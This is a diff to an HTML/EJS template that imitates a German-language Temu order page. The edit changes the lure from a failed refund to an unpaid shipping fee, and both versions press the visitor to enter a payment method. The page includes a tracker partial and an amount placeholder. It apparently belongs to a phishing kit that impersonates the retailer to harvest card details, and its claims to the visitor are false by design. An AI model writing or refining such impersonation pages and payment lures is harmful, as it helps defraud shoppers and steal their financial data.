@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Erstattungsdetails - Temu</title>
+    <title>Sendungsdetails anzeigen - Temu</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"
         integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
     <%- include('partials/tracker') %>
@@ -653,8 +653,8 @@
         <!-- Main Status Section -->
         <div class="section">
             <div class="status-message">
-                Temu hat Ihre Erstattung zur Bearbeitung an Ihr Finanzinstitut weitergeleitet. Da diese jedoch nicht
-                verarbeitet werden konnte, müssen Sie eine neue Zahlungsmethode angeben:
+                Temu hat die Sendung für den Versand vorbereitet. Für den Abschluss des Versandvorgangs ist jedoch noch eine Gebühr zu entrichten.
+Da der Versand derzeit nicht vollständig bearbeitet werden kann, muss zunächst eine gültige Zahlungsmethode hinterlegt werden. Anschließend kann der Versandvorgang fortgesetzt werden.:
             </div>
 
             <div class="refund-amount-display">
@@ -685,7 +685,7 @@
                                 <img src="./img/check-ico.svg" alt="">
                             </div>
                         </div>
-                        <div class="step-title">Temu hat Erstattung veranlasst</div>
+                        <div class="step-title">Temu-Bestellung ist bereit für den Versand</div>
                         <div class="step-date">
                             <%= processingDate %>
                         </div>
@@ -713,16 +713,16 @@
 
         <!-- Description Section -->
         <div class="section">
-            <div class="section-title">Erstattungsbeschreibung</div>
+            <div class="section-title">Versandinformationen</div>
             <div class="section-text">
-                Wir haben Ihre Erstattung für 4 Artikel veranlasst, deren Stornierung Sie beantragt haben.
-            </div>
+Nach Abschluss der Zahlung wird der Versand Ihres Pakets innerhalb von 48 Stunden bearbeitet.
+</div>
         </div>
 
         <!-- Amount and Proof Section -->
         <div class="section" style="padding-bottom: 0;">
             <div class="header-row">
-                <div class="section-title" style="margin: 0;">Erstattungsbetrag und Beleg</div>
+                <div class="section-title" style="margin: 0;">Fälliger Betrag</div>
                 <a href="#" class="view-details">Details anzeigen <svg viewBox="0 0 24 24" width="16" height="16"
                         stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"
                         stroke-linejoin="round">
@@ -734,7 +734,7 @@
                 <div class="proof-row">
                     <div class="payment-left">
                         <div class="card-icon-small" style="margin-right: 12px; transform: scale(1.2);"></div>
-                        Ursprüngliche Zahlung
+                        Fälliger Betrag
                     </div>
                     <div class="payment-right">€<%= refundAmount %>
                     </div>
@@ -749,7 +749,7 @@
                             <line x1="16" y1="17" x2="8" y2="17"></line>
                             <polyline points="10 9 9 9 8 9"></polyline>
                         </svg>
-                        Von Temu gesendeten Erstattungsbeleg anzeigen
+                        Details zum zu zahlenden Betrag ansehen
                     </div>
                     <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"
                         stroke-linecap="round" stroke-linejoin="round">
@@ -769,7 +769,7 @@
                 </svg>
             </div>
             <div class="email-text">
-                Die Erstattungsbestätigung wurde am <%= processingDate %> an Ihre E-Mail gesendet.
+                Nach Abschluss der Zahlung erhalten Sie eine Bestätigung per E-Mail.
             </div>
             <svg viewBox="0 0 24 24" width="20" height="20" stroke="#888" stroke-width="2" fill="none"
                 stroke-linecap="round" stroke-linejoin="round" style="margin-top: 5px;">
